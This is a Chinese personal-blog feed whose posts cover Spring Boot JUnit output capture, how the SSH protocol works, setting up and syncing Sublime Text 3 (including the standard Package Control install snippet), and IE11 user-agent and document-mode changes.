class="keyword">class</span>)</span></span><br><span class="line"><span class="class">//@<span class="title">WebAppConfiguration</span> // 使用@<span class="title">WebIntegrationTest</span>注解需要将@<span class="title">WebAppConfiguration</span>注释掉</span></span><br><span class="line">@WebIntegrationTest("server.port:0")// 使用0表示端口号随机，也可以具体指定如8888这样的固定端口</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloControllerTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;local.server.port&#125;"</span>)<span class="comment">// 注入端口号</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(StudentController<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Rule</span></span><br><span class="line">    <span class="comment">// 这里注意，使用@Rule注解必须要用public</span></span><br><span class="line">    <span class="keyword">public</span> OutputCapture capture = <span class="keyword">new</span> OutputCapture();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"HelloWorld"</span>);</span><br><span class="line">        logger.info(<span class="string">"logo日志也会被capture捕获测试输出"</span>);</span><br><span class="line">        assertThat(capture.toString(), Matchers.containsString(<span class="string">"World"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更加详细的Spring Boot Junit单元测试，可以参考<a href="http://blog.csdn.net/catoop/article/details/50752964">这篇博文</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
        <tag>JUnit</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH 协议原理、组成、认证方式和过程</title>
    <url>/2017/12/07/ssh-protocol-introduction/</url>
    <content><![CDATA[<p><a href="http://www.jianshu.com/p/8e5b7aea52b5">原文链接</a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>SSH</strong>是（Secure SHell protocol） 的简写，安全外壳协议（SSH）是一种在不安全网络上提供安全远程登录及其它安全网络服务的协议。</p><p><strong>OpenSSH</strong> 是SSH （Secure SHell）协议的免费开源实现。SSH协议族可以用来进行远程控制，或在计算机之间传送文件。而实现此功能的传统方式，如telnet(终端仿真协议)、 rcp ftp、 rlogin、rsh都是极为不安全的，并且会使用明文传送密码。OpenSSH提供了服务端后台程序和客户端工具，用来加密远程控件和文件传输过程的中的数据，并由此来代替原来的类似服务。<br>在过去我们使用的rsh和telnet，因为包括登录时的ID和密码数据没有加密就传到网络上，存在安全上的问题。即使在内部网上，也有在因特网上的窃取和篡改等危险性。SSH将包括密码在内的所有数据都已进行了加密处理，可以进行更安全的远程操作。在SSH中，由于协议标准的不同而存在SSH1和SSH2两个不同的版本。SSH2是为了回避SSH1所使用的加密算法的许可证问题而开发的（现在这一许可证问题已经不存在了）。TLES 8中作为安装SSH协议的应用程序采用了开放源码的OpenSSH。OpenSSH与SSH1和SSH2的任何一个协议都能对应，但默认使用SSH2。<br>更详细的说明以及安装使用，请参考官网：<a href="http://www.openssh.com/">http://www.openssh.com/</a></p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul><li><p>类似 telnet 的远程联机使用 shell 的服务器，即 ssh。</p></li><li><p>类似 FTP 服务的 sftp-server ，提供更安全的 FTP 服务。</p><p><img alt="SSH功能" data-src="SSH_1.png"></p></li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img alt="SSH工作原理" data-src="SSH_2.jpg"></p><ol><li>服务器建立公钥： 每一次启动 sshd 服务时，该服务会主动去找 /etc/ssh/ssh_host* 的文件，若系统刚刚安装完成时，由于没有这些公钥，因此 sshd 会主动去计算出这些需要的公钥，同时也会计算出服务器自己需要的私钥。</li><li>客户端主动联机请求： 若客户端想要联机到 ssh 服务器，则需要使用适当的客户端程序来联机，包括 ssh, putty 等客户端程序连接。</li><li>服务器传送公钥给客户端： 接收到客户端的要求后，服务器便将第一个步骤取得的公钥传送给客户端使用 (此时应是明码传送，反正公钥本来就是给大家使用的)。</li><li>客户端记录并比对服务器的公钥数据及随机计算自己的公私钥： 若客户端第一次连接到此服务器，则会将服务器的公钥记录到客户端的用户家目录内的 ~/.ssh/known_hosts 。若是已经记录过该服务器的公钥，则客户端会去比对此次接收到的与之前的记录是否有差异。若接受此公钥， 则开始计算客户端自己的公私钥。</li><li>回传客户端的公钥到服务器端： 用户将自己的公钥传送给服务器。此时服务器：具有服务器的私钥与客户端的公钥，而客户端则是： 具有服务器的公钥以及客户端自己的私钥，你会看到，在此次联机的服务器与客户端的密钥系统 (公钥+私钥) 并不一样，所以才称为非对称加密系统。</li><li>开始双向加解密：<ul><li>(1) 服务器到客户端：服务器传送数据时，拿用户的公钥加密后送出。客户端接收后，用自己的私钥解密</li><li>(2) 客户端到服务器：客户端传送数据时，拿服务器的公钥加密后送出。服务器接收后，用服务器的私钥解密，这样就能保证通信安全。</li></ul></li></ol><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>SSH 主要有三部分组成：</p><ol><li><p>传输层协议(The Transport Layer Protocol) [SSH-TRANS] 提供服务器认证，数据机密性，信息完整性 等的支持。此外它有时还提供压缩功能。 SSH-TRANS 通常运行在 TCP/IP连接上，也可能用于其它可靠数据流上。 SSH-TRANS 提供了强力的加密技术、密码主机认证及完整性保护。该协议中的认证基于主机，并且该协议不执行用户认证。更高层的用户认证协议可以设计为在此协议之上。</p></li><li><p>用户认证协议(The User Authentication Protocol) [SSH-USERAUTH] 用于向服务器提供客户端用户鉴别功能。它运行在传输层协议 SSH-TRANS 上面。当 SSH-USERAUTH 开始后，它从低层协议那里接收会话标识符（从第一次密钥交换中的交换哈希 H ）。会话标识符唯一标识此会话并且适用于标记以证明私钥的所有权。 SSH-USERAUTH 也需要知道低层协议是否提供保密性保护。</p></li><li><p>连接协议(The Connection Protocol) [SSH-CONNECT] 将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。将多个加密隧道分成逻辑通道。它运行在用户认证协议上。它提供了交互式登录话路、远程命令执行、转发 TCP/IP 连接和转发 X11 连接。<br>　　一旦建立一个安全传输层连接，客户机就发送一个服务请求。当用户认证完成之后，会发送第二个服务请求。这样就允许新定义的协议可以与上述协议共存。连接协议提供了用途广泛的各种通道，有标准的方法用于建立安全交互式会话外壳和转发（“隧道技术”）专有 TCP/IP 端口和 X11 连接。<br>　　通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。</p><p>同时SSH协议框架中还为许多高层的网络安全应用协议提供扩展的支持。它们之间的层次关系可以用如下图来表示：<br><img alt="SSH协议框架" data-src="SSH-3.png"></p></li></ol><h2 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h2><ul><li><p>基于口令的认证：这个就不用说了，就是输入用户名和密码</p></li><li><p>基于密钥的认证，具体步骤如下.</p><p>　*　(1).客户端建立两把钥匙(公钥与私钥)<br>　*　(2).将公钥数据上传到服务器上<br>　*　(3).将公钥放置服务器端的正确目录与文件名（scp 或 ssh-copy-id）</p><p>对于SSH这样以提供安全通讯为目标的协议，其中必不可少的就是一套完备的密钥机制。由于SSH协议是面向互联网网络中主机之间的互访与信息交换，所以主机密钥成为基本的密钥机制。也就是说，SSH协议要求每一个使用本协议的主机都必须至少有一个自己的主机密钥对，服务方通过对客户方主机密钥的认证之后，才能允许其连接请求。一个主机可以使用多个密钥，针对不同的密钥算法而拥有不同的密钥，但是至少有一种是必备的，即通过 DSS算法产生的密钥。关于DSS算法，请参考<a href="http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf">FIPS-186</a> 文档.SSH协议关于主机密钥认证的管理方案有两种，如下图所示:<br><img alt="SSH主机密钥认证_主机直发" data-src="SSH_key_manager_1.png"><br><img alt="SSH主机密钥认证_密钥认证中心" data-src="SSH_key_manager_2.png"></p><p>每一个主机都必须有自己的主机密钥，密钥可以有多对，每一对主机密钥对包括公开密钥和私有密钥。在实际应用过程中怎样使用这些密钥，并依赖它们来实现安全特性呢？如上图所示，SSH协议框架中提出了两种方案。</p><p>在第一种方案中，主机将自己的公用密钥分发给相关的客户机，客户机在访问主机时则使用该主机的公开密钥来加密数据，主机则使用自己的私有密钥来解密数据，从而实现主机密钥认证，确定客户机的可靠身份。在图2（a）中可以看到，用户从主机A上发起操作，去访问，主机B和主机C，此时，A成为客户机，它必须事先配置主机B和主机C的公开密钥，在访问的时候根据主机名来查找相应的公开密钥。对于被访问主机（也就是服务器端）来说则只要保证安全地存储自己的私有密钥就可以了。　</p><p>在第二种方案中，存在一个密钥认证中心，所有系统中提供服务的主机都将自己的公开密钥提交给认证中心，而任何作为客户机的主机则只要保存一份认证中心的公开密钥就可以了。在这种模式下，客户机在访问服务器主机之前，还必须向密钥认证中心请求认证，认证之后才能够正确地连接到目的主机上。</p><p>很显然，第一种方式比较容易实现，但是客户机关于密钥的维护却是个麻烦事，因为每次变更都必须在客户机上有所体现；第二种方式比较完美地解决管理维护问题，然而这样的模式对认证中心的要求很高，在互联网络上要实现这样的集中认证，单单是权威机构的确定就是个大麻烦，有谁能够什么都能说了算呢？但是从长远的发展来看，在企业应用和商业应用领域，采用中心认证的方案是必要的。</p><p>另外，SSH协议框架中还允许对主机密钥的一个折中处理，那就是首次访问免认证。首次访问免认证是指，在某客户机第一次访问主机时，主机不检查主机密钥，而向该客户都发放一个公开密钥的拷贝，这样在以后的访问中则必须使用该密钥，否则会被认为非法而拒绝其访问。</p></li></ul><h2 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h2><p>在整个通讯过程中，为实现 SSH的安全连接，服务器端与客户端要经历如下五个阶段：</p><ul><li>版本号协商阶段，SSH目前包括 SSH1和SSH2两个版本， 双方通过版本协商确定使用的版本</li><li>密钥和算法协商阶段，SSH支持多种加密算法， 双方根据本端和对端支持的算法，协商出最终使用的算法</li><li>认证阶段，SSH客户端向服务器端发起认证请求， 服务器端对客户端进行认证</li><li>会话请求阶段， 认证通过后，客户端向服务器端发送会话请求</li><li>交互会话阶段 ，会话请求通过后，服务器端和客户端进行信息的交互</li></ul><ol><li>版本号协商阶段<br>　　1. 服务器打开端口 22，等待客户端连接。<br>　　2. 客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。<br>　　3. 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。<br>　　4. 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。<br>　　5. 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。</li></ol><blockquote><p>Note： 版本号协商阶段报文都是采用明文方式传输的。</p></blockquote><ol start="2"><li><p>密钥和算法协商阶段<br>　　1. 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;<br>　　2. 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。<br>　　3. 服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。</p><p>通过以上步骤，服务器端和客户端就取得了相同的会话密钥和会话ID。</p><ul><li>对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全</li><li>在认证阶段，两端会使用会话 ID用于认证过程。</li></ul></li></ol><blockquote><p>Note： 在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。</p></blockquote><ol start="3"><li><p>认证阶段<br>　　1. 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。<br>　　2. 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。<br>　　3. 客户端从认证方法列表中选取一种认证方法再次进行认证。<br>　　4. 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。</p><blockquote><p>SSH提供两种认证方式</p><pre><code>1. password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。
2. publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息</code></pre><p>SSH2.0还提供了 password-publickey 认证和 any 认证:<br>　　1. password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。<br>　　2. any认证：指定该用户的认证方式可以是 password，也可以是 publickey。</p></blockquote></li><li><p>会话请求阶段</p><ol><li>服务器等待客户端的请求；</li><li>认证通过后，客户端向服务器发送会话请求；</li><li>服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。</li></ol></li><li><p>交互会话阶段<br>在这个模式下，数据被双向传送：<br>　　1. 客户端将要执行的命令加密后传给服务器;<br>　　2. 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;<br>　　3. 客户端将接收到的结果解密后显示到终端上.</p></li></ol><h2 id="SSH-Q-amp-A"><a href="#SSH-Q-amp-A" class="headerlink" title="SSH Q&amp;A"></a>SSH Q&amp;A</h2><h3 id="Q1-SSH的版本和区别。"><a href="#Q1-SSH的版本和区别。" class="headerlink" title="Q1: SSH的版本和区别。"></a>Q1: SSH的版本和区别。</h3><p>SSH2避免了RSA的专利问题，并修补了CRC的缺陷。SSH2用数字签名算法（DSA）和Diffie-Hellman（DH）算法代替RSA来完成对称密钥的交换，用HMAC来代替CRC。同时SSH2增加了AES和Twofish等对称加密算法。<br>　　A1: SSH(Secure SHell)到目前为止有两个不兼容的版本——SSH1和SSH2。SSH1又分为1.3和1.5两个版本。SSH1采用DES、3DES、 Blowfish和RC4等对称加密算法保护数据安全传输，而对称加密算法的密钥是通过非对称加密算法（RSA）来完成交换的。SSH1使用循环冗余校验码（CRC）来保证数据的完整性，但是后来发现这种方法有缺陷。<br>更多内容请参考The SSHv1 Protocol &amp; The SSHv2 Protocol</p><h3 id="Q2-什么是HMAC？"><a href="#Q2-什么是HMAC？" class="headerlink" title="Q2: 什么是HMAC？"></a>Q2: 什么是HMAC？</h3><p>　　A2: HMAC(Hash Message Authentication Code) ，散列消息鉴别码，基于密钥的Hash算法的认证协议。消息鉴别码实现鉴别的原理是，用公开函数和密钥产生一个固定长度的值作为认证标识，用这个标识鉴别消息的完整性。使用一个密钥生成一个固定大小的小数据块，即MAC，并将其加入到消息中，然后传输。接收方利用与发送方共享的密钥进行鉴别认证等。</p><h3 id="Q3-什么是X11-forwarding？"><a href="#Q3-什么是X11-forwarding？" class="headerlink" title="Q3: 什么是X11 forwarding？"></a>Q3: 什么是X11 forwarding？</h3><p>　　A3: sh的X11 forwarding特性可以使X client和X server安全地通讯。使用X11 forwarding后，从X client到X Server方向的数据先被送至ssh server，ssh server利用和ssh client的安全通道转发给ssh client，再由ssh client转发给X server，从X server到X client的数据流同理。这里ssh server和ssh client充当了X client和X server间数据的转发器，由于ssh server和X client、ssh client和X server一般在同一台机器上，它们之间是一种安全的进程间通讯，而ssh server和ssh client间的通讯也是安全的，所以X client和X server间的通讯就是安全的。</p><h3 id="Q4-什么是TTY？"><a href="#Q4-什么是TTY？" class="headerlink" title="Q4: 什么是TTY？"></a>Q4: 什么是TTY？</h3><p>　　A4: 终端是一种字符型设备，它有多种类型，通常使用tty来简称各种类型的终端设备。tty是 Teletype的缩写。Teletype是最早出现的一种终端设备，很象电传打字机，是由Teletype公司生产的。设备名放在特殊文件目录/dev/下。</p><h3 id="Q5-简单描述下SSH运行的过程？"><a href="#Q5-简单描述下SSH运行的过程？" class="headerlink" title="Q5: 简单描述下SSH运行的过程？"></a>Q5: 简单描述下SSH运行的过程？</h3><p>A5:简要过程如下</p><ul><li>Client端向Server端发起SSH连接请求。</li><li>Server端向Client端发起版本协商。</li><li>协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。</li><li>Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。</li><li>进入认证阶段。从此以后所有通信均加密。</li><li>认证成功后，进入交互阶段。</li></ul><h2 id="网络图解SSH连接过程"><a href="#网络图解SSH连接过程" class="headerlink" title="网络图解SSH连接过程"></a>网络图解SSH连接过程</h2><p><img alt="SSH连接过程" data-src="SSH.jpeg"></p>]]></content>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>sublime text 3 使用总结</title>
    <url>/2015/12/10/sublime-text-3-use-summary/</url>
    <content><![CDATA[<p>电脑从win10 32位换成64位，备份了蛮多软件配置。sublime text 2的配置居然忘记备份了，干脆直接换成sublime text 3<a href="http://c758482.r82.cf2.rackcdn.com/Sublime%20Text%20Build%203083%20x64%20Setup.exe">exe</a>，<a href="http://c758482.r82.cf2.rackcdn.com/Sublime%20Text%20Build%203083%20x64.zip">zip</a>，<a href="http://www.sublimetext.com/3">官网</a>好了。</p><p>最少sublime text 3 中的配置文件，Package安装文件，都将在主目录下Data文件夹下，而sublime text 2，则会在用户目录下，如<code>AppData &gt; Roaming &gt; sublime text</code>。</p><h2 id="安装Package-Control"><a href="#安装Package-Control" class="headerlink" title="安装Package Control"></a>安装Package Control</h2><h3 id="简单安装"><a href="#简单安装" class="headerlink" title="简单安装"></a>简单安装</h3><p>最简单的方法，使用<code>Ctrl + `</code>快捷键，或是<code>View &gt; Show Console</code>菜单项，打开控制台，然后将<code>Python</code>代码复制粘贴进控制台。<br>sublime text 3<br><code>import urllib.request,os,hashlib; h = &#39;2915d1851351e5ee549c20394736b442&#39; + &#39;8bc59f460fa1548d1514676163dafc88&#39;; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &#39;http://packagecontrol.io/&#39; + pf.replace(&#39; &#39;, &#39;%20&#39;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&#39;Error validating download (got %s instead of %s), please try manual install&#39; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &#39;wb&#39; ).write(by)</code></p><p>顺便记录下sublime text 2<br><code>import urllib2,os,hashlib; h = &#39;2915d1851351e5ee549c20394736b442&#39; + &#39;8bc59f460fa1548d1514676163dafc88&#39;; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( &#39;http://packagecontrol.io/&#39; + pf.replace(&#39; &#39;, &#39;%20&#39;)).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), &#39;wb&#39; ).write(by) if dh == h else None; print(&#39;Error validating download (got %s instead of %s), please try manual install&#39; % (dh, h) if dh != h else &#39;Please restart Sublime Text to finish installation&#39;)</code></p><h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>如果控制台安装时，出现连接问题，修改<code>hosts</code>，添加<code>50.116.34.243 sublime.wbond.net</code>也没用的话，可以使用手动安装方法。</p><ol><li>点击 <code>Preferences &gt; Browse Packages…</code> 菜单项。</li><li>将浏览打开一个文件夹，进入上一级目录，然后进入<code>Installed Packages/</code>文件夹。</li><li>下载<a href="https://packagecontrol.io/Package%20Control.sublime-package">Package Control.sublime-package</a>，并copy到<code>Installed Packages/</code>文件夹。</li><li>重启Sublime Text</li></ol><p><a href="https://packagecontrol.io/installation">安装方法原文</a></p><h2 id="添加到右键菜单"><a href="#添加到右键菜单" class="headerlink" title="添加到右键菜单"></a>添加到右键菜单</h2><p>如果使用的zip版，可以手动添加右键菜单，以便快速打开sublime text 3。</p><ol><li><code>cmd</code>命令中运行：<code>regedit</code>，打开注册表。</li><li>依次找到<code>HKEY_CLASSESS_ROOT-&gt;*-&gt;Shell</code>，下面新建项，命名为<code>Edit with Sublime Text3</code>。</li><li>在项<code>Edit with Sublime Text</code>下新建字符串值，命名为<code>Icon</code>，值为<code>D:\Program Files\Sublime Text 3\sublime_text.exe</code>,0,其中灰色地址为 Sublime Text程序文件地址。</li><li>在项<code>Edit with Sublime Text</code>下新建项<code>Command</code>，该<code>Command</code>项下默认值修改为<code>D:\Program Files\Sublime Text 3\sublime_text.exe,1</code>。</li><li>设置完成后，无需重启电脑，就可以在右键菜单中，显示<code>Edit with Sublime Text3</code>。</li></ol><h2 id="同步配置"><a href="#同步配置" class="headerlink" title="同步配置"></a>同步配置</h2><h3 id="使用Git"><a href="#使用Git" class="headerlink" title="使用Git"></a>使用Git</h3><p>使用Git时，最好是将下列文件/文件夹添加到<code>.gitignore</code>文件中。</p><pre><code>Package Control.last-run
Package Control.ca-list
Package Control.ca-bundle
Package Control.system-ca-bundle
Package Control.cache/
Package Control.ca-certs/</code></pre><h3 id="使用Dropbox"><a href="#使用Dropbox" class="headerlink" title="使用Dropbox"></a>使用Dropbox</h3><p>国内爬窗使用Dropbox。</p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>如果你的Dropbox文件夹不在默认位置，您需要更改<code>$ ENV：USERPROFILE \ Dropbox</code>的到你的位置。<br>首先，关闭sublime text，并用管理员身份打开控制台。</p><p>在待备份机器上，使用下面的命令。<br>sublime text 3</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$env</span>:appdata\Sublime Text 3\Packages\"</span></span><br><span class="line"><span class="string">mkdir <span class="variable">$env</span>:userprofile\Dropbox\Sublime</span></span><br><span class="line"><span class="string">mv User <span class="variable">$env</span>:userprofile\Dropbox\Sublime\</span></span><br><span class="line"><span class="string">cmd /c mklink /D User <span class="variable">$env</span>:userprofile\Dropbox\Sublime\User</span></span><br></pre></td></tr></table></figure><p>在还原备份机器上，使用下面的命令。下面的命令将移除用户/文件夹及下所有内容。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$env</span>:appdata\Sublime Text 3\Packages\"</span></span><br><span class="line"><span class="string">rmdir -recurse User</span></span><br><span class="line"><span class="string">cmd /c mklink /D User <span class="variable">$env</span>:userprofile\Dropbox\Sublime\User</span></span><br></pre></td></tr></table></figure><h4 id="OS-X"><a href="#OS-X" class="headerlink" title="OS X"></a>OS X</h4><p>如果你的Dropbox文件夹不在默认位置，您需要更改<code>~/Dropbox</code>的到你的位置。<br>首先，关闭sublime text，并打开控制台。<br>在待备份机器上，使用下面的命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Library/Application\ Support/Sublime\ Text\ 3/Packages/</span><br><span class="line">mkdir ~/Dropbox/Sublime</span><br><span class="line">mv User ~/Dropbox/Sublime/</span><br><span class="line">ln -s ~/Dropbox/Sublime/User</span><br></pre></td></tr></table></figure><p>在还原备份机器上，使用下面的命令。下面的命令将移除用户/文件夹及下所有内容。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Library/Application\ Support/Sublime\ Text\ 3/Packages/</span><br><span class="line">rm -r User</span><br><span class="line">ln -s ~/Dropbox/Sublime/User</span><br></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>如果你的Dropbox文件夹不在默认位置，您需要更改<code>~/Dropbox</code>的到你的位置。<br>首先，关闭sublime text，并打开控制台。<br>在待备份机器上，使用下面的命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.config/sublime-text-3/Packages/</span><br><span class="line">mkdir ~/Dropbox/Sublime</span><br><span class="line">mv User ~/Dropbox/Sublime/</span><br><span class="line">ln -s ~/Dropbox/Sublime/User</span><br></pre></td></tr></table></figure><p>在还原备份机器上，使用下面的命令。下面的命令将移除用户/文件夹及下所有内容。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.config/sublime-text-3/Packages/</span><br><span class="line">rm -r User</span><br><span class="line">ln -s ~/Dropbox/Sublime/User</span><br></pre></td></tr></table></figure><p><a href="https://packagecontrol.io/docs/syncing">同步配置原文</a></p><p>##使用技巧</p><p>单个多选变量名：Cmd-D (Win: Ctrl-D) 按一下只会只选择下一个<br>跳过多选变量名：Cmd-K, Cmd-D (Win: Ctrl-K, Ctrl-D)<br>全选变量名：按Ctrl-Cmd-G (Win: Alt-F3)</p><p>自适应缩进的粘贴：按Cmd-Shift-v (Win: Ctrl-Shift-v)<br>新建文件：Cmd-n (Win: Ctrl-n)<br>选择当前的最小区域：Cmd-Shift-Space (Win: Ctrl-Shift-Space)<br>查找打开过的文件：Ctrl+P，然后输入最近的文件名就可以即时预览到文件内容<br>命令输入框：Ctrl+Shift+P<br>查找：Ctrl + F<br>查找并替换：Ctrl + Shift + F<br>鼠标中键，也就是鼠标滚轮！鼠标滚轮也可以选中字符，但不同用鼠标左键选择的是，他不会跨行选择，而是直接矩形选择。<br>Emmet使用：Tab键，如html:5,Tab键</p><p><a href="http://www.zhihu.com/question/24896283">Sublime Text 有哪些使用技巧？</a><br><a href="http://www.zhihu.com/question/19976788">Sublime Text 有哪些实用技巧？</a></p>]]></content>
      <tags>
        <tag>Editor</tag>
      </tags>
  </entry>
  <entry>
    <title>一些升级IE11后的兼容性更改</title>
    <url>/2015/06/16/upgrade-IE11-compatibility-chanages/</url>
    <content><![CDATA[<h2 id="User-agent-字符串更改"><a href="#User-agent-字符串更改" class="headerlink" title="User-agent 字符串更改"></a>User-agent 字符串更改</h2><p>这是首次微软真正更改了user-agent字符串，这使得很多判断浏览器是否IE的代码无法工作，包括有些JavaScript的isIE()的方法在Internet Explorer 11上执行会返回false。<br>不过好在Internet Explorer 11对Web标准的支持非常好，因此不再需要之前那些IE特定的行为。</p><p>在Internet Explorer 11中，user-agent比之前的版本要短很多，而且去掉了最关键的MSIE的关键字：</p><p>Internet Explorer 10 的 user-agent（on Win 7）：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">10.0</span>; Windows NT <span class="number">6.1</span>; WOW64; Trident/<span class="number">6.0</span>)</span><br></pre></td></tr></table></figure><p>Internet Explorer 11 的 user-agent（on Win 7）：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Trident/<span class="number">7.0</span>; rv <span class="number">11.0</span>) like Gecko</span><br></pre></td></tr></table></figure><p>Internet Explorer 11 的 user-agent（on Win 8）：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.3</span>; Trident/<span class="number">7.0</span>; rv <span class="number">11.0</span>) like Gecko</span><br></pre></td></tr></table></figure><ul><li>兼容 (“兼容”) 和浏览器 (“MSIE”) 令牌已删除。</li><li>“like Gecko” 令牌已添加（以便与其他浏览器一致）。</li><li>浏览器版本现在由新版本 (“rv”) 令牌报告。</li></ul><p>上述user-agent中增加了Gecko的标识，而Safari是首个标注了Gecko的浏览器。</p><p>IE11提倡应避免检测特定浏览器或版本，应检测需要使用的功能并使用渐进增强为不支持所需功能的浏览器或设备提供简化体验。<br>之前多数使用MSIE来判断是否IE浏览器的代码都无法工作，在极少数情况下，必须唯一地标识 IE11时，可以改用<a href="https://msdn.microsoft.com/zh-cn/library/ms537503(v=vs.85).aspx">Trident令牌字符串</a>来判断。Trident标识是在IE9中引入的。</p><h2 id="文档模式更改"><a href="#文档模式更改" class="headerlink" title="文档模式更改"></a>文档模式更改</h2><p>从 IE11 开始，边缘模式成为首选文档模式；它代表可供浏览器使用的现行标准的最高支持。<br>使用 HTML5 文档类型声明启用边缘模式：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Internet Explorer 8 中引入了边缘模式并且每个后续版本中也提供了该模式。 注意，边缘模式支持的功能会限制为呈现内容的特定浏览器版本支持的功能。<br>从 IE11 开始，文档模式被弃用，除了临时情况外不应再使用。 